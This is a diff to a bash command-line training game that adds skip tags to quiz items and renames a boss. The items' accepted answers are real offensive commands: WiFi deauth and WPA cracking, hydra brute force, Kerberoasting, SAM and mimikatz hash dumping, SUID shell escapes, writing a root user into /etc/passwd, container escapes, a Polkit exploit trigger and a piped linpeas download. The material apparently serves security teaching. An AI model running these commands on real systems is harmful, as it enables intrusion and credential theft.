@@ -178,7 +178,7 @@ EOF
 # ═══ BOSSES & LEVELS ═══
 BOSS_NAMES=("" "n00b" "CopyPasta" "Clobber" "CatMan" "PipeWrench" "Murmur" "DevNull" "AndOr" "\$VARIABLE" "\$\$"
   "BackgroundNoise" "TestCase" "Gatekeeper" "Daemon" "Mux" "Needle" "Globber" "Sieve" "ArrayLord" "TheFork"
-  "Swarm" "Regex" "Rebase" "Netcat" "TheFirewall" "Spectrum" "Collision" "Void" "SUID" "ROOT")
+  "Swarm" "Regex" "Rebase" "Netcat" "TheFirewall" "Spectrum" "Collision" "Void" "Phantom" "ROOT")
 BOSS_FLAVOR=("" "There is no shortcut. Only the first step." "Every copy is a ghost of the original." "What you saved, I devour."
   "I read the bones of dead files." "Data is blood. I am the vein." "I feed the silence into your commands."
   "Your stderr falls into the void." "True or false. Live or die." "I hold what you've forgotten."
@@ -188,7 +188,7 @@ BOSS_FLAVOR=("" "There is no shortcut. Only the first step." "Every copy is a gh
   "Count from zero. End at null." "Every path diverges. None return." "A thousand commands. One directive."
   "I see patterns in your ashes." "Your history is mine to rewrite." "I listen where you cannot see."
   "Nothing enters. Nothing leaves." "Every frequency bleeds secrets." "Your hashes are already broken."
-  "I am where data goes to die." "I wear the mask of root." "I am ROOT. Bow or break.")
+  "I am where data goes to die." "Every privilege is a door I already opened." "I am ROOT. Bow or break.")
 LEVEL_NAMES=("" "First Steps" "File Basics" "Save Your Work" "Reading Files" "Basic Pipes"
   "Input & Here-Strings" "Error Handling" "Logic Gates" "Variables" "Special Variables" "Job Control"
   "Test Conditions" "Core File Tools" "System Admin" "Multiplexers" "Text Search"
@@ -1156,7 +1156,11 @@ explain() {
 #   $_QV declares ~40 local vars, _ctx() populates them via _fpick from pools
 _qparse() {
   local q=$1
-  _qoutput="" _qstate="" _qtext=0 _qrequire="" _qdelim='|'
+  _qoutput="" _qstate="" _qtext=0 _qrequire="" _qdelim='|' _qboss_skip=0 _qchal_skip=0
+
+  # Boolean tags: deleted in-place so they can sit anywhere without breaking value-tag strips
+  if [[ $q == *"#boss-skip"* ]]; then _qboss_skip=1; q="${q//#boss-skip/}"; fi
+  if [[ $q == *"#chal-skip"* ]]; then _qchal_skip=1; q="${q//#chal-skip/}"; fi
 
   if [[ $q == *"#text:"* ]]; then
     _qtext=1
@@ -2359,10 +2363,10 @@ gen_level26() {
   questions+=("Send ${W}5${C} deauth packets to force handshake|aireplay-ng -0 5 -a ${mac} ${wiface}mon|aireplay-ng --deauth 5 -a ${mac} ${wiface}mon|sudo aireplay-ng -0 5 -a ${mac} ${wiface}mon|sudo aireplay-ng --deauth 5 -a ${mac} ${wiface}mon|aireplay-ng -a ${mac} -0 5 ${wiface}mon|sudo aireplay-ng -a ${mac} -0 5 ${wiface}mon|aireplay-ng -a ${mac} --deauth 5 ${wiface}mon|sudo aireplay-ng -a ${mac} --deauth 5 ${wiface}mon")
   questions+=("Crack WPA handshake in ${W}capture-01.cap${C} using ${W}${wordlist}${C}|aircrack-ng -w ${wordlist} capture-01.cap|sudo aircrack-ng -w ${wordlist} capture-01.cap|aircrack-ng capture-01.cap -w ${wordlist}|sudo aircrack-ng capture-01.cap -w ${wordlist}")
   questions+=("WPS pixie-dust attack on AP ${W}${mac}${C}|reaver -i ${wiface}mon -b ${mac} -K 1|sudo reaver -i ${wiface}mon -b ${mac} -K 1|reaver -i ${wiface}mon -b ${mac} --pixie-dust|sudo reaver -i ${wiface}mon -b ${mac} --pixie-dust|bully -b ${mac} -d ${wiface}mon|sudo bully -b ${mac} -d ${wiface}mon")
-  questions+=("Clientless PMKID-only capture from ${W}${mac}${C}|hcxdumptool -i ${wiface}mon --filterlist_ap=${mac} --filtermode=2 -o pmkid.pcapng|sudo hcxdumptool -i ${wiface}mon --filterlist_ap=${mac} --filtermode=2 -o pmkid.pcapng|hcxdumptool -i ${wiface}mon --filterlist_ap=${mac} -o pmkid.pcapng|sudo hcxdumptool -i ${wiface}mon --filterlist_ap=${mac} -o pmkid.pcapng")
-  questions+=("Wireshark/tshark filter: only EAPOL frames in ${W}${pcap}${C}|tshark -r ${pcap} -Y eapol|tshark -r ${pcap} -Y 'eapol'|tshark -r ${pcap} -Y eapol -w eapol.pcapng")
+  questions+=("Clientless PMKID-only capture from ${W}${mac}${C}|hcxdumptool -i ${wiface}mon --filterlist_ap=${mac} --filtermode=2 -o pmkid.pcapng|sudo hcxdumptool -i ${wiface}mon --filterlist_ap=${mac} --filtermode=2 -o pmkid.pcapng|hcxdumptool -i ${wiface}mon --filterlist_ap=${mac} -o pmkid.pcapng|sudo hcxdumptool -i ${wiface}mon --filterlist_ap=${mac} -o pmkid.pcapng#boss-skip")
+  questions+=("Wireshark/tshark filter: only EAPOL frames in ${W}${pcap}${C}|tshark -r ${pcap} -Y eapol|tshark -r ${pcap} -Y 'eapol'|tshark -r ${pcap} -Y eapol -w eapol.pcapng#boss-skip")
   questions+=("Wireshark/tshark filter: beacon frames (subtype 8) in ${W}${pcap}${C}|tshark -r ${pcap} -Y 'wlan.fc.type_subtype == 8'|tshark -r ${pcap} -Y 'wlan.fc.type_subtype==8'")
-  questions+=("Channel-hop scan across all bands (a/b/g)|airodump-ng --band abg ${wiface}mon|sudo airodump-ng --band abg ${wiface}mon|airodump-ng -C 1,6,11,36,40,44,48 ${wiface}mon|sudo airodump-ng -C 1,6,11,36,40,44,48 ${wiface}mon")
+  questions+=("Channel-hop scan across all bands (a/b/g)|airodump-ng --band abg ${wiface}mon|sudo airodump-ng --band abg ${wiface}mon|airodump-ng -C 1,6,11,36,40,44,48 ${wiface}mon|sudo airodump-ng -C 1,6,11,36,40,44,48 ${wiface}mon#boss-skip")
   questions+=("Show wireless interfaces (modern)|iw dev|sudo iw dev")
   questions+=("Scan for nearby APs|iw dev ${wiface} scan|sudo iw dev ${wiface} scan|nmcli dev wifi list|nmcli device wifi list|iwlist ${wiface} scan|sudo iwlist ${wiface} scan")
   questions+=("Show connected WiFi info|iw dev ${wiface} link|sudo iw dev ${wiface} link|iwconfig ${wiface}|sudo iwconfig ${wiface}")
@@ -2378,7 +2382,7 @@ gen_level26() {
   questions+=("Scan 433 MHz devices (RTL-SDR)|rtl_433|rtl_433 -F json|sudo rtl_433")
   questions+=("Scan for nearby classic Bluetooth (BR/EDR) devices|bluetoothctl scan bredr|sudo bluetoothctl scan bredr|hcitool scan|sudo hcitool scan")
   questions+=("Scan for nearby Bluetooth Low Energy (BLE) devices|bluetoothctl scan le|sudo bluetoothctl scan le|bluetoothctl --timeout 10 scan le|sudo bluetoothctl --timeout 10 scan le|hcitool lescan|sudo hcitool lescan")
-  questions+=("Bettercap WiFi recon module|bettercap -iface ${wiface} -eval 'wifi.recon on'|sudo bettercap -iface ${wiface} -eval 'wifi.recon on'")
+  questions+=("Bettercap WiFi recon module|bettercap -iface ${wiface} -eval 'wifi.recon on'|sudo bettercap -iface ${wiface} -eval 'wifi.recon on'#boss-skip")
   questions+=("Connect to SSID ${W}CorpWiFi${C} via nmcli (password 'pass123')|nmcli dev wifi connect CorpWiFi password pass123|nmcli device wifi connect CorpWiFi password pass123|sudo nmcli dev wifi connect CorpWiFi password pass123|sudo nmcli device wifi connect CorpWiFi password pass123")
   questions+=("List saved nmcli connection profiles|nmcli connection show|nmcli con show|nmcli c show|nmcli c")
   questions+=("Show wireless regulatory domain|iw reg get|sudo iw reg get|iw reg|sudo iw reg")
@@ -2410,7 +2414,7 @@ gen_level27() {
   questions+=("Brute force SSH login for ${user} on ${ip} using ${W}${wordlist}${C}|hydra -l ${user} -P ${wordlist} ${ip} ssh|hydra -l ${user} -P ${wordlist} ssh://${ip}|hydra -P ${wordlist} -l ${user} ${ip} ssh|hydra -P ${wordlist} -l ${user} ssh://${ip}")
   questions+=("Brute force FTP login for ${user} on ${ip} using ${W}${wordlist}${C}|hydra -l ${user} -P ${wordlist} ${ip} ftp|hydra -l ${user} -P ${wordlist} ftp://${ip}|hydra -P ${wordlist} -l ${user} ${ip} ftp|hydra -P ${wordlist} -l ${user} ftp://${ip}")
   questions+=("Brute force HTTP basic auth on ${ip} using ${W}${wordlist}${C}|hydra -l ${user} -P ${wordlist} ${ip} http-get /|hydra -l ${user} -P ${wordlist} http-get://${ip}/|hydra -P ${wordlist} -l ${user} ${ip} http-get /|hydra -P ${wordlist} -l ${user} http-get://${ip}/")
-  questions+=("Hydra HTTP POST: form at /login, fields user=^USER^&pass=^PASS^, fail string 'Invalid'|hydra -l ${user} -P ${wordlist} ${ip} http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'|hydra -l ${user} -P ${wordlist} http-post-form://${ip}/login:user=^USER^&pass=^PASS^:Invalid|hydra -P ${wordlist} -l ${user} ${ip} http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'|hydra -P ${wordlist} -l ${user} http-post-form://${ip}/login:user=^USER^&pass=^PASS^:Invalid")
+  questions+=("Hydra HTTP POST: form at /login, fields user=^USER^&pass=^PASS^, fail string 'Invalid'|hydra -l ${user} -P ${wordlist} ${ip} http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'|hydra -l ${user} -P ${wordlist} http-post-form://${ip}/login:user=^USER^&pass=^PASS^:Invalid|hydra -P ${wordlist} -l ${user} ${ip} http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'|hydra -P ${wordlist} -l ${user} http-post-form://${ip}/login:user=^USER^&pass=^PASS^:Invalid#boss-skip#chal-skip")
   questions+=("Brute force with ${W}${wordlist}${C} and username list|hydra -L users.txt -P ${wordlist} ${ip} ssh|hydra -L users.txt -P ${wordlist} ssh://${ip}|hydra -P ${wordlist} -L users.txt ${ip} ssh|hydra -P ${wordlist} -L users.txt ssh://${ip}")
   questions+=("Brute force with ${W}${wordlist}${C}, limit to 4 parallel tasks|hydra -t 4 -l ${user} -P ${wordlist} ${ip} ssh|hydra -t 4 -l ${user} -P ${wordlist} ssh://${ip}|hydra -t 4 -P ${wordlist} -l ${user} ${ip} ssh|hydra -t 4 -P ${wordlist} -l ${user} ssh://${ip}|hydra -l ${user} -P ${wordlist} -t 4 ${ip} ssh|hydra -P ${wordlist} -l ${user} -t 4 ${ip} ssh")
   questions+=("Encode string 'secret' to base64§echo -n 'secret' | base64§echo -n \"secret\" | base64§echo -n secret | base64§printf 'secret' | base64§printf \"secret\" | base64§printf secret | base64§printf '%s' 'secret' | base64§printf '%s' secret | base64")
@@ -2438,10 +2442,10 @@ gen_level27() {
   questions+=("Crack KeePass database (-m 13400) using ${W}${wordlist}${C}|hashcat -m 13400 ${hash} ${wordlist}|hashcat -a 0 -m 13400 ${hash} ${wordlist}")
   questions+=("Extract KeePass hash from ${W}database.kdbx${C} for cracking|keepass2john database.kdbx > ${hash}|~^keepass2john database\\.kdbx > .+$")
   questions+=("Combinator attack (-a 1): concat every word from two wordlists|hashcat -a 1 -m 0 ${hash} ${wordlist} wordlist2.txt|hashcat -m 0 -a 1 ${hash} ${wordlist} wordlist2.txt")
-  questions+=("Run as named session 'corp' with 1h max runtime|hashcat -m 1000 -a 0 --session=corp --runtime=3600 ${hash} ${wordlist}|hashcat -m 1000 --session=corp --runtime=3600 ${hash} ${wordlist}")
-  questions+=("Preview rule expansion without cracking§hashcat -a 0 -r /usr/share/hashcat/rules/best64.rule --stdout ${wordlist}§hashcat --stdout -r /usr/share/hashcat/rules/best64.rule ${wordlist}§hashcat -r /usr/share/hashcat/rules/best64.rule --stdout ${wordlist}")
-  questions+=("Kerberoast: request TGS tickets via impacket (DC at ${ip})|impacket-GetUserSPNs -request -dc-ip ${ip} domain/user:pass -outputfile ${hash}|GetUserSPNs.py -request -dc-ip ${ip} domain/user:pass -outputfile ${hash}")
-  questions+=("Extract NTLM hashes from mimikatz output§grep -oP 'NTLM\\s+:\\s+\\K[a-f0-9]{32}' mimikatz.txt > ${hash}§grep -oE '[a-f0-9]{32}' mimikatz.txt > ${hash}§awk '/NTLM/ {print \$NF}' mimikatz.txt > ${hash}")
+  questions+=("Run as named session 'corp' with 1h max runtime|hashcat -m 1000 -a 0 --session=corp --runtime=3600 ${hash} ${wordlist}|hashcat -m 1000 --session=corp --runtime=3600 ${hash} ${wordlist}#boss-skip")
+  questions+=("Preview rule expansion without cracking§hashcat -a 0 -r /usr/share/hashcat/rules/best64.rule --stdout ${wordlist}§hashcat --stdout -r /usr/share/hashcat/rules/best64.rule ${wordlist}§hashcat -r /usr/share/hashcat/rules/best64.rule --stdout ${wordlist}#boss-skip")
+  questions+=("Kerberoast: request TGS tickets via impacket (DC at ${ip})|impacket-GetUserSPNs -request -dc-ip ${ip} domain/user:pass -outputfile ${hash}|GetUserSPNs.py -request -dc-ip ${ip} domain/user:pass -outputfile ${hash}#boss-skip#chal-skip")
+  questions+=("Extract NTLM hashes from mimikatz output§grep -oP 'NTLM\\s+:\\s+\\K[a-f0-9]{32}' mimikatz.txt > ${hash}§grep -oE '[a-f0-9]{32}' mimikatz.txt > ${hash}§awk '/NTLM/ {print \$NF}' mimikatz.txt > ${hash}#boss-skip")
   questions+=("Extract GPG keyring hash for cracking|gpg2john secring.gpg > ${hash}|~^gpg2john secring\\.gpg > .+$")
   questions+=("Extract SSH private key hash for cracking|ssh2john ~/.ssh/id_rsa > ${hash}|ssh2john.py ~/.ssh/id_rsa > ${hash}|~^ssh2john(\\.py)? ~/\\.ssh/id_rsa > .+$")
   questions+=("Extract MS Office document hash for cracking|office2john document.docx > ${hash}|office2john.py document.docx > ${hash}|~^office2john(\\.py)? document\\.docx > .+$")
@@ -2463,8 +2467,8 @@ gen_level28() {
   questions+=("Show all ELF info in ${W}${bin}${C}|readelf -a ${bin}|readelf --all ${bin}")
   questions+=("List shared library dependencies of ${W}${bin}${C}§ldd ${bin}§objdump -p ${bin} | grep NEEDED§readelf -d ${bin} | grep NEEDED")
   questions+=("Analyze ${bin} with radare2|r2 -A ${bin}|radare2 -A ${bin}")
-  questions+=("Disassemble main function of ${W}${bin}${C}|r2 -qc 'aaa; pdf @main' ${bin}|r2 -qc \"aaa; pdf @main\" ${bin}|radare2 -qc 'aaa; pdf @main' ${bin}|radare2 -qc \"aaa; pdf @main\" ${bin}")
-  questions+=("List functions in ${W}${bin}${C}|r2 -qc 'aaa; afl' ${bin}|r2 -qc \"aaa; afl\" ${bin}|radare2 -qc 'aaa; afl' ${bin}|radare2 -qc \"aaa; afl\" ${bin}")
+  questions+=("Disassemble main function of ${W}${bin}${C}|r2 -qc 'aaa; pdf @main' ${bin}|r2 -qc \"aaa; pdf @main\" ${bin}|radare2 -qc 'aaa; pdf @main' ${bin}|radare2 -qc \"aaa; pdf @main\" ${bin}#boss-skip")
+  questions+=("List functions in ${W}${bin}${C}|r2 -qc 'aaa; afl' ${bin}|r2 -qc \"aaa; afl\" ${bin}|radare2 -qc 'aaa; afl' ${bin}|radare2 -qc \"aaa; afl\" ${bin}#boss-skip")
   questions+=("Scan ${bin} for embedded files|binwalk ${bin}|binwalk -B ${bin}|binwalk --signature ${bin}|binwalk signature ${bin}")
   questions+=("Extract embedded files from ${bin}|binwalk -e ${bin}|binwalk --extract ${bin}|binwalk extract ${bin}")
   questions+=("Analyze entropy of ${bin}|binwalk -E ${bin}|binwalk --entropy ${bin}|binwalk entropy ${bin}")
@@ -2487,7 +2491,7 @@ gen_level28() {
   questions+=("List files recursively in ${W}${img}${C}|fls -r ${img}")
   questions+=("List deleted files in ${W}${img}${C}|fls -d ${img}")
   questions+=("Create filesystem timeline|mactime -b ${dir}/bodyfile|~^mactime -b .+$")
-  questions+=("Create bodyfile from ${W}${img}${C}, save to ${W}${dir}/bodyfile${C}|fls -r -m / ${img} > ${dir}/bodyfile|fls -m / -r ${img} > ${dir}/bodyfile")
+  questions+=("Create bodyfile from ${W}${img}${C}, save to ${W}${dir}/bodyfile${C}|fls -r -m / ${img} > ${dir}/bodyfile|fls -m / -r ${img} > ${dir}/bodyfile#boss-skip")
   questions+=("Disassemble ${W}${bin}${C} with objdump|objdump -d ${bin}|objdump --disassemble ${bin}|objdump -d -M intel ${bin}|objdump --disassemble -M intel ${bin}")
   questions+=("Extract hidden data from ${W}${photo}${C} with steghide|steghide extract -sf ${photo}|steghide extract -sf ${photo} -p ''")
   questions+=("Crack steghide passphrase on ${W}${photo}${C} using ${W}${wordlist}${C}|stegseek ${photo} ${wordlist}|stegseek --crack ${photo} ${wordlist}")
@@ -2501,8 +2505,8 @@ gen_level28() {
   questions+=("Dump LSA secrets from memory (vol3)|vol -f ${memimg} windows.lsadump|vol3 -f ${memimg} windows.lsadump|volatility3 -f ${memimg} windows.lsadump")
   questions+=("Carve every artifact category from ${W}${img}${C} into output/|bulk_extractor -o output/ ${img}|sudo bulk_extractor -o output/ ${img}")
   questions+=("Scan ${W}${dir}${C}/ recursively with YARA ruleset rules.yar|yara -r rules.yar ${dir}/|yara --recursive rules.yar ${dir}/|yara -r rules.yar ${dir}|yara --recursive rules.yar ${dir}")
-  questions+=("Find CTF flags inside ${W}${bin}${C} (pattern flag{...})§strings ${bin} | grep -oE 'flag\\{[^}]+\\}'§strings -a ${bin} | grep -oE 'flag\\{[^}]+\\}'§strings ${bin} | grep -oP 'flag\\{[^}]+\\}'§rg -ao 'flag\\{[^}]+\\}' ${bin}")
-  questions+=("Detect JPEG steganography (outguess/F5/JSteg) in ${W}${photo}${C}|stegdetect ${photo}|stegdetect -tjopi ${photo}")
+  questions+=("Find CTF flags inside ${W}${bin}${C} (pattern flag{...})§strings ${bin} | grep -oE 'flag\\{[^}]+\\}'§strings -a ${bin} | grep -oE 'flag\\{[^}]+\\}'§strings ${bin} | grep -oP 'flag\\{[^}]+\\}'§rg -ao 'flag\\{[^}]+\\}' ${bin}#boss-skip")
+  questions+=("Detect JPEG steganography (outguess/F5/JSteg) in ${W}${photo}${C}|stegdetect ${photo}|stegdetect -tjopi ${photo}#boss-skip")
   questions+=("Dump NTLM hashes from offline SAM/SYSTEM hives in ${W}${dir}${C}|impacket-secretsdump -sam ${dir}/SAM -system ${dir}/SYSTEM LOCAL|secretsdump.py -sam ${dir}/SAM -system ${dir}/SYSTEM LOCAL|impacket-secretsdump -system ${dir}/SYSTEM -sam ${dir}/SAM LOCAL")
   questions+=("Parse Windows event log to JSONL|evtx_dump -o jsonl Security.evtx > sec.jsonl|evtx_dump Security.evtx -o jsonl > sec.jsonl|~^evtx_dump (-o jsonl Security\\.evtx|Security\\.evtx -o jsonl) > .+$")
   questions+=("Build super-timeline from disk image ${W}${img}${C} into plaso.db|log2timeline.py plaso.db ${img}|log2timeline plaso.db ${img}")
@@ -2532,14 +2536,14 @@ gen_level29() {
   questions+=("SUID vim shell escape|vim -c ':!/bin/sh -p'|vim -c ':!/bin/bash -p'|vi -c ':!/bin/sh -p'|vi -c ':!/bin/bash -p'|vim -c ':!sh -p'|vim -c ':!bash -p'|vi -c ':!sh -p'|vi -c ':!bash -p'|vim -c ':py3 import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'|vim -c ':py3 import os; os.execl(\"/bin/bash\", \"bash\", \"-p\")'")
   questions+=("SUID python3 shell|python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'|python3 -c 'import os; os.execl(\"/bin/bash\", \"bash\", \"-p\")'|python3 -c 'import pty; pty.spawn(\"/bin/sh\")'|python3 -c 'import pty; pty.spawn(\"/bin/bash\")'|python3 -c 'import os;os.system(\"/bin/sh -p\")'|python3 -c 'import os;os.system(\"/bin/bash -p\")'|python -c 'import pty; pty.spawn(\"/bin/sh\")'|python -c 'import pty; pty.spawn(\"/bin/bash\")'")
   questions+=("Sudo env privesc|sudo env /bin/sh|sudo env /bin/bash|sudo env sh|sudo env bash|sudo /usr/bin/env /bin/sh|sudo /usr/bin/env /bin/bash")
-  questions+=("Check kernel exploits (searchsploit, strip arch suffix)§searchsploit linux kernel \$(uname -r | cut -d- -f1)§searchsploit linux kernel | grep \$(uname -r | cut -d- -f1)§searchsploit -m linux/local/ kernel \$(uname -r | cut -d- -f1)")
+  questions+=("Check kernel exploits (searchsploit, strip arch suffix)§searchsploit linux kernel \$(uname -r | cut -d- -f1)§searchsploit linux kernel | grep \$(uname -r | cut -d- -f1)§searchsploit -m linux/local/ kernel \$(uname -r | cut -d- -f1)#boss-skip")
   questions+=("Docker socket check|ls -la /var/run/docker.sock|ls -l /var/run/docker.sock")
   questions+=("Docker escape via socket|docker run -v /:/mnt --rm -it alpine chroot /mnt sh|docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash|docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh|docker run -v /:/mnt --rm -it alpine chroot /mnt bash|sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh|sudo docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash|sudo docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh|sudo docker run -v /:/mnt --rm -it alpine chroot /mnt bash")
   questions+=("LXD privesc: init privileged ubuntu:22.04 container named 'privesc'|lxc init ubuntu:22.04 privesc -c security.privileged=true|lxc init ubuntu:22.04 privesc --config security.privileged=true|lxc init ubuntu:22.04 privesc --config=security.privileged=true|sudo lxc init ubuntu:22.04 privesc -c security.privileged=true|sudo lxc init ubuntu:22.04 privesc --config security.privileged=true")
   questions+=("Check ${W}/etc/passwd${C} writable|ls -la /etc/passwd|ls -l /etc/passwd|stat /etc/passwd")
   questions+=("Find all world-writable files|find / -writable -type f 2>/dev/null|find / -perm -o+w -type f 2>/dev/null|find / -perm -0002 -type f 2>/dev/null|find / -type f -writable 2>/dev/null|find / -type f -perm -o+w 2>/dev/null|find / -type f -perm -0002 2>/dev/null")
   questions+=("Privesc: add root user to ${W}/etc/passwd${C} (when writable)|echo \"hacker:\$(openssl passwd -6 pass):0:0::/root:/bin/bash\" >> /etc/passwd|echo \"hacker:\$(openssl passwd -6 pass):0:0::/root:/bin/sh\" >> /etc/passwd|echo \"hacker:\$(openssl passwd -1 pass):0:0::/root:/bin/bash\" >> /etc/passwd|echo \"hacker:\$(openssl passwd -1 pass):0:0::/root:/bin/sh\" >> /etc/passwd")
-  questions+=("Find writable scripts in cron§grep -v '^#' /etc/crontab | awk '{print \$NF}' | xargs ls -la 2>/dev/null§cat /etc/crontab | awk '{print \$NF}' | xargs ls -la 2>/dev/null")
+  questions+=("Find writable scripts in cron§grep -v '^#' /etc/crontab | awk '{print \$NF}' | xargs ls -la 2>/dev/null§cat /etc/crontab | awk '{print \$NF}' | xargs ls -la 2>/dev/null#boss-skip")
   questions+=("Check current PATH|echo \$PATH|echo \${PATH}|printenv PATH")
   questions+=("Prepend current dir to PATH|export PATH=.:\$PATH|PATH=.:\$PATH")
   questions+=("Create malicious binary|echo '#!/bin/bash' > /tmp/ls && echo '/bin/bash -p' >> /tmp/ls && chmod +x /tmp/ls|echo '#!/bin/bash' > /tmp/ls; echo '/bin/bash -p' >> /tmp/ls; chmod +x /tmp/ls")
@@ -2547,19 +2551,19 @@ gen_level29() {
   questions+=("Check NFS exports|showmount -e ${ip}|cat /etc/exports")
   questions+=("Mount NFS export ${ip}:/share at /mnt|mount -t nfs ${ip}:/share /mnt|sudo mount -t nfs ${ip}:/share /mnt|mount ${ip}:/share /mnt|mount -t nfs ${ip}:/share /mnt/|sudo mount -t nfs ${ip}:/share /mnt/|mount ${ip}:/share /mnt/|sudo mount ${ip}:/share /mnt|sudo mount ${ip}:/share /mnt/")
   questions+=("Create SUID on NFS|cp /bin/bash /mnt && chmod +s /mnt/bash|cp /bin/bash /mnt && chmod u+s /mnt/bash|cp /bin/bash /mnt; chmod +s /mnt/bash|cp /bin/bash /mnt; chmod u+s /mnt/bash|cp /bin/bash /mnt && chmod 4755 /mnt/bash|cp /bin/bash /mnt; chmod 4755 /mnt/bash|cp /bin/sh /mnt && chmod +s /mnt/sh|cp /bin/sh /mnt; chmod +s /mnt/sh|cp /bin/sh /mnt && chmod u+s /mnt/sh|cp /bin/sh /mnt; chmod u+s /mnt/sh|cp /bin/sh /mnt && chmod 4755 /mnt/sh|cp /bin/sh /mnt; chmod 4755 /mnt/sh")
-  questions+=("Run linpeas (auto-enum)§curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh§wget -qO- https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh§curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh§bash linpeas.sh")
+  questions+=("Run linpeas (auto-enum)§curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh§wget -qO- https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh§curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh§bash linpeas.sh#boss-skip")
   questions+=("Run pspy (process spy, no root needed)|./pspy64|./pspy32|./pspy64 -pf -i 1000")
   questions+=("SUID awk shell escape|awk 'BEGIN{system(\"/bin/sh -p\")}'|awk 'BEGIN{system(\"/bin/bash -p\")}'|awk 'BEGIN {system(\"/bin/sh\")}'|awk 'BEGIN {system(\"/bin/bash\")}'")
   questions+=("SUID perl shell escape (LIST form preserves -p)|perl -e 'exec \"/bin/sh\", \"-p\";'|perl -e 'exec \"/bin/bash\", \"-p\";'|perl -e 'exec \"/bin/sh\";'|perl -e 'exec \"/bin/bash\";'")
   questions+=("Check pkexec version (CVE-2021-4034 PwnKit, fixed in 0.120)|pkexec --version|pkexec -V")
-  questions+=("Trigger Polkit CVE-2021-3560 dbus race (RHEL8/Ubuntu 20.04)§dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:hacker string:'' int32:1 & sleep 0.005s; kill \$!§bash cve-2021-3560.sh")
-  questions+=("Check sudo for Baron Samedit (CVE-2021-3156, fixed in 1.9.5p2)§sudoedit -s '\\\\\\\\' \$(python3 -c 'print(\"A\"*1000)') 2>&1 | grep -qi 'usage' && echo patched || echo vulnerable§sudo --version§sudo -V")
+  questions+=("Trigger Polkit CVE-2021-3560 dbus race (RHEL8/Ubuntu 20.04)§dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:hacker string:'' int32:1 & sleep 0.005s; kill \$!§bash cve-2021-3560.sh#boss-skip#chal-skip")
+  questions+=("Check sudo for Baron Samedit (CVE-2021-3156, fixed in 1.9.5p2)§sudoedit -s '\\\\\\\\' \$(python3 -c 'print(\"A\"*1000)') 2>&1 | grep -qi 'usage' && echo patched || echo vulnerable§sudo --version§sudo -V#boss-skip")
   questions+=("Check kernel for Dirty Pipe (CVE-2022-0847, vuln: 5.8 ≤ ver < 5.16.11 / 5.15.25 / 5.10.102)§uname -r§hostnamectl | grep -i kernel§cat /proc/version")
   questions+=("List all cron dirs manually|ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/|ls -la /etc/cron.* /etc/crontab")
-  questions+=("Stabilize a dumb reverse shell to a full TTY§python3 -c 'import pty;pty.spawn(\"/bin/bash\")' && export TERM=xterm && stty raw -echo; fg§python3 -c 'import pty;pty.spawn(\"/bin/bash\")'§python -c 'import pty;pty.spawn(\"/bin/bash\")'§script -qc /bin/bash /dev/null")
-  questions+=("Triage linpeas output for high-confidence (95-99%) findings§./linpeas.sh | grep -E '\\[95%|\\[97%|\\[99%'§bash linpeas.sh | grep -iE '95%|99%|CVE-[0-9]'§linpeas.sh 2>/dev/null | grep -E '\\[95\\]|\\[97\\]|\\[99\\]'")
+  questions+=("Stabilize a dumb reverse shell to a full TTY§python3 -c 'import pty;pty.spawn(\"/bin/bash\")' && export TERM=xterm && stty raw -echo; fg§python3 -c 'import pty;pty.spawn(\"/bin/bash\")'§python -c 'import pty;pty.spawn(\"/bin/bash\")'§script -qc /bin/bash /dev/null#boss-skip#chal-skip")
+  questions+=("Triage linpeas output for high-confidence (95-99%) findings§./linpeas.sh | grep -E '\\[95%|\\[97%|\\[99%'§bash linpeas.sh | grep -iE '95%|99%|CVE-[0-9]'§linpeas.sh 2>/dev/null | grep -E '\\[95\\]|\\[97\\]|\\[99\\]'#boss-skip")
   questions+=("Find writable systemd service files|find /etc/systemd/system /lib/systemd/system -writable -name '*.service' 2>/dev/null|find /etc/systemd/system -perm -o+w -name '*.service' 2>/dev/null|find /etc/systemd/system /usr/lib/systemd/system -writable -name '*.service' 2>/dev/null")
-  questions+=("Tar wildcard injection: drop checkpoint files in cwd before cron tar runs§touch -- '--checkpoint=1' '--checkpoint-action=exec=sh shell.sh'§echo '' > '--checkpoint=1' && echo '' > '--checkpoint-action=exec=sh shell.sh'§printf '' > '--checkpoint=1'; printf '' > '--checkpoint-action=exec=sh shell.sh'")
+  questions+=("Tar wildcard injection: drop checkpoint files in cwd before cron tar runs§touch -- '--checkpoint=1' '--checkpoint-action=exec=sh shell.sh'§echo '' > '--checkpoint=1' && echo '' > '--checkpoint-action=exec=sh shell.sh'§printf '' > '--checkpoint=1'; printf '' > '--checkpoint-action=exec=sh shell.sh'#boss-skip")
   questions+=("LXD privesc step 2: attach host root as recursive disk to 'privesc'|lxc config device add privesc hostdisk disk source=/ path=/mnt recursive=true|sudo lxc config device add privesc hostdisk disk source=/ path=/mnt recursive=true")
   questions+=("LXD privesc step 3: start the privileged container|lxc start privesc|sudo lxc start privesc")
   questions+=("LXD privesc step 4: chroot into host filesystem via container|lxc exec privesc -- chroot /mnt sh|lxc exec privesc -- chroot /mnt /bin/sh|sudo lxc exec privesc -- chroot /mnt sh|sudo lxc exec privesc -- chroot /mnt /bin/sh")
@@ -2589,8 +2593,8 @@ gen_level30() {
